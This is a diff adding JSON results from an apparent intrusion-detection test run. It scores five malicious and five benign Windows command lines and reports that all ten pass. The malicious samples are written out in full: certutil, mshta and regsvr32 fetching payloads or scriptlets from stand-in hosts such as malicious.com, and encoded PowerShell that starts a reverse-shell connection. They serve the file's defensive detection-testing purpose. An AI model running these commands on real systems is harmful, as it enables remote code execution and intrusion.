@@ -1,0 +1,130 @@
+{
+  "total_tests": 10,
+  "passed": 10,
+  "failed": 0,
+  "details": [
+    {
+      "test_id": 1,
+      "description": "CertUtil downloading executable from malicious domain",
+      "process": "certutil.exe",
+      "command": "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\harmless.exe",
+      "expected_alert": true,
+      "actual_alert": true,
+      "result": "PASSED",
+      "execution_time_ms": 0.32
+    },
+    {
+      "test_id": 2,
+      "description": "PowerShell encoded command for reverse shell",
+      "process": "powershell.exe",
+      "command": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA",
+      "expected_alert": true,
+      "actual_alert": true,
+      "result": "PASSED",
+      "execution_time_ms": 0.91
+    },
+    {
+      "test_id": 3,
+      "description": "Regsvr32 AppLocker bypass technique",
+      "process": "regsvr32.exe",
+      "command": "regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll",
+      "expected_alert": true,
+      "actual_alert": true,
+      "result": "PASSED",
+      "execution_time_ms": 0.37
+    },
+    {
+      "test_id": 4,
+      "description": "MSHTA executing remote JavaScript",
+      "process": "mshta.exe",
+      "command": "mshta.exe javascript:a=GetObject(\"script:http://malicious.com/code.sct\").Exec();close();",
+      "expected_alert": true,
+      "actual_alert": true,
+      "result": "PASSED",
+      "execution_time_ms": 0.69
+    },
+    {
+      "test_id": 5,
+      "description": "WMIC creating PowerShell process with encoded command",
+      "process": "wmic.exe",
+      "command": "wmic.exe process call create powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
+      "expected_alert": true,
+      "actual_alert": true,
+      "result": "PASSED",
+      "execution_time_ms": 0.64
+    },
+    {
+      "test_id": 6,
+      "description": "CertUtil legitimate certificate verification",
+      "process": "certutil.exe",
+      "command": "certutil.exe -verify certificate.crt",
+      "expected_alert": false,
+      "actual_alert": false,
+      "result": "PASSED",
+      "execution_time_ms": 0.04
+    },
+    {
+      "test_id": 7,
+      "description": "PowerShell legitimate process listing",
+      "process": "powershell.exe",
+      "command": "powershell.exe Get-Process",
+      "expected_alert": false,
+      "actual_alert": false,
+      "result": "PASSED",
+      "execution_time_ms": 0.03
+    },
+    {
+      "test_id": 8,
+      "description": "Regsvr32 legitimate DLL registration",
+      "process": "regsvr32.exe",
+      "command": "regsvr32.exe C:\\Windows\\System32\\vbscript.dll",
+      "expected_alert": false,
+      "actual_alert": false,
+      "result": "PASSED",
+      "execution_time_ms": 0.49
+    },
+    {
+      "test_id": 9,
+      "description": "CertUtil downloading from whitelisted domain",
+      "process": "certutil.exe",
+      "command": "certutil.exe -urlcache -f https://www.microsoft.com/download.exe C:\\temp\\update.exe",
+      "expected_alert": false,
+      "actual_alert": false,
+      "result": "PASSED",
+      "execution_time_ms": 0.13
+    },
+    {
+      "test_id": 10,
+      "description": "Regsvr32 with whitelisted command",
+      "process": "regsvr32.exe",
+      "command": "regsvr32.exe /s /n /i:/MLDisplayX.dll",
+      "expected_alert": false,
+      "actual_alert": false,
+      "result": "PASSED",
+      "execution_time_ms": 0.03
+    }
+  ],
+  "success_rate": 100.0,
+  "timestamp": "2025-03-10 12:39:24",
+  "performance": {
+    "timestamp": "2025-03-10 12:39:24",
+    "system": {
+      "avg_cpu_percent": 6.1,
+      "avg_memory_percent": 67.1,
+      "current_cpu_percent": 6.1,
+      "current_memory_percent": 67.1
+    },
+    "ids": {
+      "total_processes_analyzed": 10,
+      "total_alerts_generated": 5,
+      "avg_execution_time_ms": 0.36,
+      "top_triggered_rules": {
+        "CertUtil Download": 1,
+        "PowerShell Encoded Command": 1,
+        "Regsvr32 AppLocker Bypass": 1,
+        "MSHTA Suspicious Execution": 1,
+        "WMIC Process Creation": 1
+      }
+    }
+  }
+}
